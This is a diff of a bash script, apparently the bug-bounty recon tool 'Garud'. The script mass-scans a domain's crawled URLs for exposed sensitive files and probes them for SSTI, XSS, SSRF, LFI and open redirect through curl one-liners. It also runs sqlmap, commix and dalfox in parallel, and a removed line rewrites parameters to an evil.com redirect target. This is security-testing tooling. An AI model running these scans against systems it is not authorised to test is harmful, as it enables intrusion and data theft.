+    cat enumeration/endpoints.txt | cut -d"?" -f1 | cut -d"=" -f1 | grep -iaE "([^.]+)\.zip$|([^.]+)\.zip\.[0-9]+$|([^.]+)\.zip[0-9]+$|([^.]+)\.zip[a-z][A-Z][0-9]+$|([^.]+)\.zip\.[a-z][A-Z][0-9]+$|([^.]+)\.rar$|([^.]+)\.tar$|([^.]+)\.tar\.gz$|([^.]+)\.tgz$|([^.]+)\.sql$|([^.]+)\.db$|([^.]+)\.sqlite$|([^.]+)\.pgsql\.txt$|([^.]+)\.mysql\.txt$|([^.]+)\.gz$|([^.]+)\.config$|([^.]+)\.log$|([^.]+)\.bak$|([^.]+)\.backup$|([^.]+)\.bkp$|([^.]+)\.crt$|([^.]+)\.dat$|([^.]+)\.eml$|([^.]+)\.java$|([^.]+)\.lst$|([^.]+)\.key$|([^.]+)\.passwd$|([^.]+)\.pl$|([^.]+)\.pwd$|([^.]+)\.mysql-connect$|([^.]+)\.jar$|([^.]+)\.cfg$|([^.]+)\.dir$|([^.]+)\.orig$|([^.]+)\.bz2$|([^.]+)\.old$|([^.]+)\.vbs$|([^.]+)\.img$|([^.]+)\.inf$|([^.]+)\.sh$|([^.]+)\.py$|([^.]+)\.vbproj$|([^.]+)\.mysql-pconnect$|([^.]+)\.war$|([^.]+)\.go$|([^.]+)\.psql$|([^.]+)\.sql\.gz$|([^.]+)\.vb$|([^.]+)\.webinfo$|([^.]+)\.jnlp$|([^.]+)\.cgi$|([^.]+)\.temp$|([^.]+)\.ini$|([^.]+)\.webproj$|([^.]+)\.xsql$|([^.]+)\.raw$|([^.]+)\.inc$|([^.]+)\.lck$|([^.]+)\.nz$|([^.]+)\.rc$|([^.]+)\.html\.gz$|([^.]+)\.gz$|([^.]+)\.env$|([^.]+)\.yml$" | httpx -silent -follow-host-redirects | anew -q vulnerabilities/sensitivefiles.txt &> /dev/null
+    xargs -a enumeration/patterns/xss.txt -P 30 -I % bash -c "echo % | kxss" 2> /dev/null | anew -q injections/kxss.txt &>  /dev/null
+    xargs -a tempssti.txt -P 50 -I % bash -c "curl -s -L -H \"X-Bugbounty: Testing\" -H \"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.77 Safari/537.36\" --insecure '%' | grep \"check-ssti49\" && echo -e \"[POTENTIAL SSTI] - % \n \"" 2> /dev/null | grep "POTENTIAL SSTI" | anew injections/ssti.txt | notify -silent &> /dev/null
+    xargs -a tempxss.txt -P 50 -I % bash -c "curl -s -L -H \"X-Bugbounty: Testing\" -H \"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.77 Safari/537.36\" --insecure '%' | grep \"<svg/onload=confirm(document.domain)>\" && echo -e \"[POTENTIAL XSS] - % \n \"" 2> /dev/null | grep "POTENTIAL XSS" | anew injections/xss.txt | notify -silent &> /dev/null
+    xargs -a tempssrf.txt -P 50 -I % bash -c "curl -ks -H \"X-Bugbounty: Testing\" -H \"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.77 Safari/537.36\" --insecure '%' | grep \"compute.internal\" && echo -e \"[POTENTIAL SSRF] - % \n \"" 2> /dev/null | grep "POTENTIAL SSRF" | anew injections/ssrf.txt | notify -silent &> /dev/null
+    xargs -a templfi.txt -P 50 -I % bash -c "curl -s -L -H \"X-Bugbounty: Testing\" -H \"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.77 Safari/537.36\" --insecure '%' | grep \"root:x:\" && echo -e \"[POTENTIAL LFI] - host \n \"" 2> /dev/null | grep "POTENTIAL LFI" | anew injections/lfi.txt | notify -silent &> /dev/null
+    xargs -a tempred.txt -P 50 -I % bash -c "curl -s -iL -H \"X-Bugbounty: Testing\" -H \"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.77 Safari/537.36\" --insecure '%' | grep \"Evil.Com - We get it...Daily\" && echo -e \"[POTENTIAL REDIRECT] - % \n \"" 2> /dev/null | grep "POTENTIAL REDIRECT" | anew injections/redirect.txt | notify -silent &> /dev/null
+    xargs -a enumeration/patterns/sqli.txt -P 50 -I % bash -c "python3 ~/tools/sqlmap/sqlmap.py -u % -b --batch --disable-coloring --random-agent --output-dir=injections/sqli/" 2> /dev/null &> /dev/null
+    xargs -a enumeration/patterns/rce.txt -P 50 -I % bash -c "python3 ~/tools/commix/commix.py -u % --batch --output-dir injections/cmdin/" 2> /dev/null &> /dev/null
+    if [ -n "$blindxss" ]; then
+        dalfox file enumeration/patterns/xss.txt pipe --silence --no-color --no-spinner --mass --mass-worker 100 --skip-bav -b $blindxss -w 100 -H "X-Bugbounty: Testing" -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.77 Safari/537.36" 2> /dev/null | anew injections/dalfoxss.txt | notify -silent &> /dev/null
+    else
+        dalfox file enumeration/patterns/xss.txt pipe --silence --no-color --no-spinner --mass --mass-worker 100 --skip-bav -w 100 -H "X-Bugbounty: Testing" -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.77 Safari/537.36" 2> /dev/null | anew injections/dalfoxss.txt | notify -silent &> /dev/null
     fi
+    echo -e "${BOLD}Common injection scan is completed of $domain${NORMAL}"
+    echo -e "Common injection scan is completed of $domain" | notify -silent &> /dev/null
+    rm -rf temp*
 }
 
-check_open() {
-    sleep 1s
-    echo -ne "${NORMAL}${BOLD}${YELLOW} ● Scanning is in progress:${NORMAL}${BOLD} Checking for open redirection in $domain [${GREEN}${BLINK}97%${NORMAL}] \r"
-    cat parameters/patterns/redirect.txt | qsreplace "http://www.evil.com/" 2> /dev/null | xargs -P 50 -I % bash -c "curl -s -iL '%' | grep \"Evil.Com - We get it...Daily\" && echo -e \"[VULNERABLE] - % \n \"" 2> /dev/null | grep "VULNERABLE" | anew vulnerabilities/injections/redirect.txt | notify -silent &> /dev/null #fixed this oneliner false-positive output
-    echo -ne "${NORMAL}${BOLD}${YELLOW} ● Scanning is in progress:${NORMAL}${BOLD} Fuzzing for directories of $domain [${GREEN}${BLINK}98%${NORMAL}] \r"
-    interlace -tL domains/activeurls.txt -threads 10 -c "fuzzy _target_ ~/wordlists/big.txt" &> /dev/null
-    sleep 1s
-    echo -ne "${NORMAL}${BOLD}${YELLOW} ● Scanning is in progress:${NORMAL}${BOLD} Setting things up for $domain [${GREEN}${BLINK}100%${NORMAL}] \r"
-    sleep 1s
-    echo -ne "\n"
-    echo -e "${NORMAL}${BOLD} ● Scanning Completed. Thanks for using Garud."
+DURATION=$SECONDS
+
+# Finishing things, removing temporary files
+finScan() {
+    echo -e "${BOLD}Scanning completed on $domain. Total $(($DURATION / 60)) min and $(($DURATION % 60)) seconds taken${NORMAL}"
+    echo -e "Scanning completed on $domain. Total $(($DURATION / 60)) min and $(($DURATION % 60)) seconds taken" | notify -silent &> /dev/null
+    echo -e "Output will saved in $(pwd)" | notify -silent &> /dev/null
+    echo -e "Hii $(whoami), thanks for using Garud. Best of luck ;)" | notify -silent
+    echo -e "${BOLD}Hii $(whoami), thanks for using Garud. Best of luck ;)${NORMAL}"
 }
 
-final_bot() {
-    sleep 2s
-    echo -e "${NORMAL}${BOLD}${YELLOW}\n ●Sending Notifications.....\n"
-    echo -e "$(cat domains/finalsubdomains.txt | wc -l) subdomains found of $domain" | notify -silent &> /dev/null
-    echo -e "$(cat domains/activeurls.txt | wc -l) active urls found of $domain" | notify -silent &> /dev/null
-    echo -e "Hii $(whoami),\nRecon completed for $domain.\nAll your outputs are saved in $(pwd).\n Thanks for using Garud" | notify -silent &> /dev/null
-}
-
-run_scans() {
-    scan_targets
+runGarud() {
     makeFolders
-    run_subenum
-    run_info
-    run_params
-    run_gf
-    check_crlf
-    check_mail
-    check_ssti
-    check_lfi
-    check_nuclei
-    check_infoleak
-    check_sqli
-    check_xss
-    check_open
-    final_bot
+    subEnum
+    subCrawl
+    nucScan
+    injScan
+    finScan
     exit 1
 }
 
 while true
 do
-    load_colors
-    show_logo
-    run_scans
+    initColors
+    printBanner
+    runGarud
 done
